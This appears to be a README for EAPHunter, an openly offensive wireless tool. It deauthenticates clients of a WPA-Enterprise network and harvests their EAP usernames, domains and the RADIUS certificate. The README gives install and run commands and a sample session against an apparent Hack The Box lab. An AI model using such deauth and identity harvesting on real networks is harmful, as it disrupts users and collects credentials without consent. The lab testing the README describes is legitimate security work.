# EAPHunter

Monitors clients on a WPA-Enterprise AP, deauthenticates them, and harvests
EAP outer identities (username/domain) and the RADIUS server certificate.

## Requirements

```
pip install scapy cryptography
```

## Usage

```
sudo python3 eaphunter.py -e <SSID> -i <interface> [-c <secs>] [-o <dir>]
```

A live client table updates continuously. Enter a client number to deauth it,
`auto` to work through all clients automatically (60s apart), or `q` to quit.

## Sample

```
EAPHunter  —  WPA-EAP Credential Harvester

  --------------------------------------------------------------
  Monitor Mode
  --------------------------------------------------------------
  [*] Killing interfering processes …
  [+] Monitor mode active on wlan0

  --------------------------------------------------------------
  AP Discovery
  --------------------------------------------------------------
  [*] Scanning for 'HTB-Corp' …
  [+] SSID    : HTB-Corp
  [+] BSSID   : 5c:64:f1:c0:10:a1
  [+] Channel : 6

  ==============================================================
  EAPHunter  |  HTB-Corp  |  5c:64:f1:c0:10:a1  |  ch 6  |  14:32:09
  ==============================================================
  #      MAC ADDRESS             PWR    PKTS  VENDOR                     STATUS
  ─────  ────────────────────  ─────  ──────  ─────────────────────────  ──────────
  [1]    d4:61:9d:34:a1:02       -48      91  Apple
  [2]    6c:40:08:bb:23:f7       -61     203  Apple
  [3]    00:1b:77:c2:09:ae       -73      44  Intel

  [?] Select [1-3], 'auto', or 'q': 2

  --------------------------------------------------------------
  Deauthentication + Handshake Capture
  --------------------------------------------------------------
  [!] Sending deauth frames  ->  6c:40:08:bb:23:f7  (AP: 5c:64:f1:c0:10:a1)
  [+] Deauth frames sent — waiting for EAP exchange …
  [+] EAP Method    : EAP-PEAP
  [+] EAP Identity  : jsmith@htb-corp.local
  [*]   Username : jsmith
  [*]   Domain   : htb-corp.local
  [+] Pcap saved: ./eaphunter_HTB-Corp_20240512_143209/eap_handshake_6c4008bb23f7.pcap  (847 packets)

  --------------------------------------------------------------
  EAP Certificate Extraction
  --------------------------------------------------------------
  [+] AP 5c:64:f1:c0:10:a1  ->  Client 6c:40:08:bb:23:f7
  [+] Saved DER : ./eaphunter_HTB-Corp_20240512_143209/eap_server_cert.der
  [+] Saved PEM : ./eaphunter_HTB-Corp_20240512_143209/eap_server_cert.pem

  -- Certificate Details ----------------------------------------
  Subject    : CN=radius.htb-corp.local,O=HTB Corp,C=US
  Issuer     : CN=HTB Corp CA,O=HTB Corp,C=US
  Not Before : 2024-01-15 09:00:00
  Not After  : 2025-01-15 09:00:00
  SHA-256    : 4a:f3:1b:...
  [*] Returning to monitoring …
```

## Output

- `eap_identities.txt` — captured outer identities
- `eap_server_cert.der/.pem` — RADIUS server certificate
- `eap_handshake_<mac>.pcap` — raw capture per target
